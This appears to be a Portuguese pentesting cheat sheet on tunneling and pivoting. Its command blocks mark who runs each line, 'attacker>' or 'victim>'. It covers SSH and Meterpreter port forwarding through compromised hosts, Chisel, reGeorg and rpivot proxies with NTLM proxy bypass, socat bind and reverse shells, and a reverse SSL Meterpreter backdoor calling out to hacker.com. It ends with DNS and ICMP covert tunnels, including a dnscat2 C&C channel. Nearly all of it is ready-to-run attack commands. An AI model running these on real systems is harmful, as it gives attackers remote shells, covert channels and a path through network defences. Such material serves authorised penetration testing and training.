# Tunelamento e Port Forwarding

## **SSH**

Conexão gráfica SSH (X)

```bash
ssh -Y -C <user>@<ip> # -Y é menos seguro, mas mais rápido que -X
```

### Local Port2Port

Abrir uma nova porta no servidor SSH -> Outra porta

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Porta local 1521 acessível na porta 10521 de qualquer lugar
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Porta remota 1521 acessível na porta 10521 de qualquer lugar
```

### Port2Port

Porta Local -> Host comprometido (SSH) -> Terceira_maquina:Porta

```bash
ssh -i ssh_key <usuario>@<ip_comprometido> -L <porta_do_atacante>:<ip_da_vitima>:<porta_remota> [-p <porta_ssh>] [-N -f]  #Dessa forma, o terminal ainda está em seu host

#Exemplo
sudo ssh -L 631:<ip_da_vitima>:631 -N -f -l <usuário> <ip_comprometido>
```

### Port2hostnet (proxychains)

Porta Local -> Host comprometido (SSH) -> Qualquer lugar

```bash
ssh -f -N -D <porta_do_atacante> <usuario>@<ip_comprometido> #Tudo enviado para a porta local irá ser redirecionado para o servidor comprometido (uso como proxy)
```

### Túnel - VPN

Você precisa de root em ambos os dispositivos \(já que criará novas interfaces\) e a configuração do sshd deve permitir o login de root:

`PermitRootLogin yes`  
`PermitTunnel yes`

```bash
ssh username@server -w any:any #Isso criará interfaces Tun em ambos os dispositivos.
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
```

Ativando o forwarding do lado do servidor

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Defina uma nova rota do lado do cliente

```text
route add -net 10.0.0.0/16 gw 1.1.1.1
```

## SSHUTTLE

Você pode **tunelar** via **ssh** todo o **tráfego** para uma **sub-rede** por meio de um host.
Exemplo, tunelando todo o tráfego que vai para 10.10.10.0/24

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

## Meterpreter

### Port2Port

Porta Local -> Host comprometido \(sessão ativa\) -> Terceira_maquina:Porta

```bash
# Inside a meterpreter session
portfwd add -l <porta_do_atacante> -p <porta_remota> -r <host_remoto>
```

### Port2hostnet \(proxychains\)

```bash
background# meterpreter session
route add <ip_vitima> <máscara_de_rede> <sessão> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Outra forma:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Você precisa fazer upload de um arquivo web de túnel: ashx\|aspx\|js\|jsp\|php\|php\|jsp

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Você pode baixá-lo na página de releases do [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)  
Você precisa usar a **mesma versão para o cliente e o servidor**

### socks

```bash
./chisel server -p 8080 --reverse #Server
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client
#E agora você pode usar proxychains com a porta 1080 (padrão)
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Túnel reverso. O túnel é iniciado a partir da vítima.
Um proxy socks4 é criado em 127.0.0.1:1080

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot through **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP-LISTEN:<lport>,fork TCP:<redirect_ip>:<rport> &
```

### Port2Port via socks

```bash
socat TCP-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter via Socat com SSL

```bash
#Crie o backdoor do meterpreter na porta 3333 e inicie o listener do msfconsole nessa porta
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute o meterpreter
```

Você pode burlar um **proxy não autenticado** executando esta linha em vez da última no console da vítima:

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Túnel Socat com SSL

**/bin/sh console**

Crie certificados em ambos os lados: Cliente e Servidor

```bash
# Execute este comando em ambos os lados
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Port2Port Remoto

Conecte a porta SSH local \(22\) à porta 443 do host não autorizado

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost 
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Conecte-se à porta 443 do invasor e tudo que vier daqui será redirecionado para a porta 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Conecta-se ao SSH da vítima
```

## Plink.exe

É como uma versão de console do PuTTY \(as opções são muito semelhantes a um cliente ssh\).

Como este binário será executado na vítima e é um cliente ssh, precisamos abrir nossa porta e serviço ssh para que possamos ter uma conexão reversa. Portanto, para encaminhar apenas uma porta acessível localmente para uma porta em nossa máquina:

```bash
echo y | plink.exe -l <nosso_username_valido> -pw <senha_valida> [-p <porta>] -R <porta_no_nosso_host>:<proximo_ip>:<porta_final> <seu_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Porta local 9090 para a porta 9090 externa
```

## Bypass de proxy NTLM

A ferramenta mencionada anteriormente: **Rpivot**

**OpenVPN** também pode burlá-lo definindo estas opções no arquivo de configuração:

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Ele se autentica em um proxy e faz bind em uma porta localmente, que é encaminhada ao serviço externo que você especificar. Então você pode usar a ferramenta de sua escolha por meio desta porta.

Exemplo que faz o forward da porta 443

```text
Username Alice 
Password P@ssw0rd 
Domain CONTOSO.COM 
Proxy 10.0.0.10:8080 
Tunnel 2222:<attackers_machine>:443
```

Agora, se você definir, por exemplo na vítima o serviço **SSH** para escutar na porta 443. Você pode se conectar a ele por meio da porta 2222 do invasor.
Você também pode usar o **meterpreter** que se conecta no localhost:443 e o invasor está escutando na porta 2222.

## YARP

Um proxy reverso criado pela Microsoft. Você pode encontrá-lo aqui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

O root é necessário em ambos os sistemas para criar adaptadores tun e tunela dados entre eles usando consultas DNS.

```text
atacante> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
vítima> iodine -f -P P@ssw0rd tunneldomain.com -r
#Você pode ver a vítima no 1.1.1.2
```

O túnel vai ser muito lento. Você pode criar uma conexão SSH comprimida por meio deste túnel usando:

```text
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

Estabeleça um canal C&C por meio do DNS. Não precisa de privilégios de root.

```bash
atacante> ruby ./dnscat2.rb tunneldomain.com
vítima> ./dnscat2 tunneldomain.com
```

**Tunelamento de portas com dnscat**

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Troque o DNS do Proxychains

o Proxychains intercepta a chamada `gethostbyname` da libc e tunela a solicitação DNS tcp através do proxy socks. Por **padrão** o servidor **DNS** que o proxychains usa é **4.2.2.2** \(hardcoded\). Para alterá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **Ambiente Windows**, você pode definir o IP do **domain controller**.

## Túneis em Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## Tunelamento ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)  
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

O root é necessário em ambos os sistemas para criar adaptadores tun e tunela dados entre eles usando requests echo do ICMP.

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #Após uma conexão bem sucedida, A vítima estara acessível pelo ip 1.1.1.100
```

## Outras ferramentas para verificar

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
* [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

